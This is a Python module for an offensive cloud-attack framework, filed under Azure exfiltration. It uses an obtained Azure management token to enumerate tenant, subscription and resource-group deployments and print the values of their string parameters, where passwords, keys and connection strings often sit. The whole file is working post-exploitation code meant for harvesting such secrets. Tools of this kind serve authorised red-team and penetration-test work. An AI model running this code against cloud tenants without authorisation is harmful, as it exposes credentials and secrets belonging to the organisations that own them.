from stratustryke.core.module import AzureModule
from stratustryke.core.lib import module_data_dir
from stratustryke.core.credential import AZ_MGMT_TOKEN_SCOPE
import json
from pathlib import Path


class Module(AzureModule):
    def __init__(self, framework) -> None:
        super().__init__(framework)
        self._info = {
            'Authors': ['@vexance'],
            'Description': 'Exfiltrate values for string type deployment parameters',
            'Details': 'Retrieves String type deployment parameters for resource group & subscription deployments',
            'References': [ 'https://github.com/vexance/RunbookExporter' ]
        }

        # self._options.add_string('ACCOUNT_PREFIX', 'Prefix for automation accounts to inclde (default: ALL) [S/F/P]')
        # self._options.add_string('RUNBOOK_PREFIX', 'Prefix for runbooks to include (default: ALL) [S/F/P]', False)
        self._options.add_boolean('VERBOSE', 'When enabled, prints non-String parameter values as well', True, False)
        
        self.auth_token = None

    
    @property
    def search_name(self):
        return f'azure/exfil/authed/{self.name}'
    

    def inspect_tenant_deployments(self) -> list:
        '''List tenant-level deployments'''

        ret = []
        headers = {'Authorization': f'Bearer {self.auth_token}'}
        endpoint = 'https://management.azure.com/providers/Microsoft.Resources/deployments/?api-version=2021-04-01'

        res = self.http_request('GET', endpoint, headers=headers)
        deployments = json.loads(res.text).get('value', [])


        # TODO: Logic to parse response for parameters!!
        verbose = self.get_opt('VERBOSE')
        reportable = []
        for entry in deployments:
            parameters = entry.get('parameters')

            
            for key in parameters.keys():
                type = parameters[key].get('type', None)
                val = parameters[key].get('value', None)

                if (type == 'String' or verbose) and val != None: reportable.append(f'({type}) {key} {val}')

        if len(reportable) < 1:
            self.framework.print_failure('No tenant-level deployment parameters found')
        for line in reportable:
            self.framework.print_success(line)

        return ret


    def inspect_subscription_deployments(self, subscription: str) -> list:
        '''List subscription-level deployments within the target subscription'''

        ret = []
        headers = {'Authorization': f'Bearer {self.auth_token}'}
        endpoint = f'https://management.azure.com/subscriptions/{subscription}/providers/Microsoft.Resources/deployments/'
        
        res = self.http_request('GET', endpoint, headers=headers)
        deployments = json.loads(res.text).get('value', [])

        # TODO: Logic to parse response for parameters!!
        verbose = self.get_opt('VERBOSE')
        reportable = []
        for entry in deployments:
            parameters = entry.get('parameters')

            
            for key in parameters.keys():
                type = parameters[key].get('type', None)
                val = parameters[key].get('value', None)

                if (type == 'String' or verbose) and val != None: reportable.append(f'({type}) {key} {val}')

        if len(reportable) < 1:
            self.framework.print_failure(f'No subscription-level deployment parameters found')
        for line in reportable:
            self.framework.print_success(line)

        return ret
    

    def inspect_resource_group_deployments(self, subscription: str) -> list:
        '''List resource groups configured within the subscription and their deployments'''
        ret = []
        headers = {'Authorization': f'Bearer {self.auth_token}'}
        group_ids = self.list_resource_groups(subscription)
        self.framework.print_status(f'Identified {len(group_ids)} resource groups in subscription {subscription}')
        # Resource Group Id format is /subscriptions/SUBSCRIPTION_ID/resourceGroups/RESOURCE_GROU_NAME"

        if len(group_ids) < 1:
             self.framework.print_failure(f'No resource-group-level deployment parameters found')

        for resource_group in group_ids:
            endpoint = f'https://management.azure.com{resource_group}/providers/Microsoft.Resources/deployments/?api-version=2025-04-01'
            res = self.http_request('GET', endpoint, headers=headers)
            deployments = json.loads(res.text).get('value', [])
            
            # TODO: Logic to parse response for parameters!!
            verbose = self.get_opt('VERBOSE')
            reportable = []
            for entry in deployments:
                parameters = entry.get('parameters')

                
                for key in parameters.keys():
                    type = parameters[key].get('type', None)
                    val = parameters[key].get('value', None)

                    if (type == 'String' or verbose) and val != None:
                        reportable.append(f'({type}) {key} {val}')

            if len(reportable) > 0:
                self.framework.print_status(f'Deployment parameters found for {resource_group}')
                for line in reportable:
                    self.framework.print_success(line)
            else: self.framework.print_failure(f'No resource-group-level deployment parameters found')

        return ret
    


    def run(self) -> None:
        
        self.auth_token = self.get_cred().access_token(scope=AZ_MGMT_TOKEN_SCOPE)
        subscriptions = self.get_opt_az_subscription()

        self.framework.print_status(f'Attempting to retrieve tenant-level deployment parameters...')
        ret = self.inspect_tenant_deployments()
        
        for subscription in subscriptions:
            self.framework.print_status(f'Searching for deployment parameters in {subscription}')
            ret = self.inspect_subscription_deployments(subscription)
            ret = self.inspect_resource_group_deployments(subscription)

        return None

